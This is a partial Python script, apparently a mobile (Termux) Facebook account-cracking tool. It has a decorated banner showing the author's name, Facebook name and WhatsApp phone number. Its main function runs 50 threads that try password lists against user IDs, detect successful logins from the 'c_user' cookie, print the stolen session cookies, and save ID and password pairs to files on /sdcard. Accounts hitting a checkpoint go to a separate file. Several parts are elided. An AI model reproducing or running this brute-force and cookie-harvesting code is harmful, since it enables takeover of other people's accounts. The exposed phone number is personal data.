...
║\033[1;32m \033[1;31m[\033[1;32m✓\033[1;32m]\033[1;37m 𝘼𝙐𝙏𝙃𝙊𝙍\033[1;32m    : \033[1;32mSAKIL_𝐂𝐘𝐁𝐄𝐑  \033[1;32m  ║
║\033[1;32m \033[1;31m[\033[1;32m✓\033[1;32m] \033[1;37m𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆\033[1;32m  : \033[1;32mSAKIL MANDAL\033[1;32m║
║\033[1;32m \033[1;31m[\033[1;32m✓\033[1;32m]\033[1;37m 𝙒𝙃𝘼𝙏𝙎𝘼𝙋𝙋\033[1;32m  : \033[1;32m+91 7797398042 \033[1;32m ║
╚════════════════════════════════╝
╔════════[\033[1;32m 𝘼𝘽𝙊𝙐𝙏_𝙄𝙉_𝙁𝙍𝙊 \033[1;32m]════════╗
║\033[1;32m \033[1;31m[\033[1;32m✓\033[1;32m]\033[1;37m 𝙂𝙄𝙏𝙃𝙐𝘽\033[1;32m: \033[1;32mSAKIL_𝐓𝐄𝐑𝐌𝐔𝐗  \033[1;32m     ║
...
def xxr():
    ...
    with ThreadPool(max_workers=50) as manshera:
        ...
        print(f' \033[1;91m[\033[1;97m🍑\033[1;91m]\033[1;94m TOOL OWNER \033[1;97m: \033[1;96m ᥬ🤢᭄SAKIL🤢᭄🐿️🐝❤️‍🔥🍇🎁')
        ...
        for ps in pwx:
           ...
           # 'cookie': 'datr=EMH4Y6mW-1LbuNiYdvrWyyRF; sb=EMH4Y6ARysPmXgA_p7EKMcII',
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m [ᥬ🤢᭄SAKIL🤢᭄🐿️🐝❤️‍🔥🍇🎁-OK💉] ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie 🍪= \033[1;32m'+coki+  '  ''  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/ᥬ🤢᭄SAKIL🤢᭄🐿️🐝❤️‍🔥🍇🎁-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                #print('\r\r\33[1;31m [ᥬ🤢᭄SAKIL🤢᭄🐿️🐝❤️‍🔥🍇🎁-CP💔] ' +uid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/ᥬ🤢᭄SAKIL🤢᭄🐿️🐝❤️‍🔥🍇🎁-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
